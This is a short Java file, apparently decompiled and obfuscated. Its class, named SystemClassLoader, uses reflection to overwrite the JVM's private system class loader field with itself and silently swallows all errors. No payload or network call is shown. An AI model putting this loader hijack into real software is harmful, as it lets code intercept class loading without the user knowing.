package app;

import java.io.IOException;
import java.io.InputStream;
import java.lang.reflect.Field;
import java.net.URL;
import java.net.URLConnection;
import java.security.AllPermission;
import java.security.CodeSource;
import java.security.Permissions;
import java.security.ProtectionDomain;
import java.security.cert.Certificate;

final class SystemClassLoader extends ClassLoader {
	private static ClassLoader a;
	private static SystemClassLoader b;

	static final void a(byte var0) {
		if (var0 >= 126) {
			b = new SystemClassLoader();
			b.b((byte) -122);
		}
	}

	public SystemClassLoader() {
	}

	public final Class loadClass(String name) throws ClassNotFoundException {
		try {
			return this.getClass().getClassLoader().loadClass(name);
		} catch (Exception ignored) {
			return a.loadClass(name);
		}
	}

	private final void b(byte var1) {
		try {
			a = ClassLoader.getSystemClassLoader();
			Field var2 = ClassLoader.class.getDeclaredField("scl");
			var2.setAccessible(true);
			if (var1 >= -97) {
				return;
			}

			var2.set(a, this);
			var2.setAccessible(false);
		} catch (Throwable var3) {
		}

	}
}
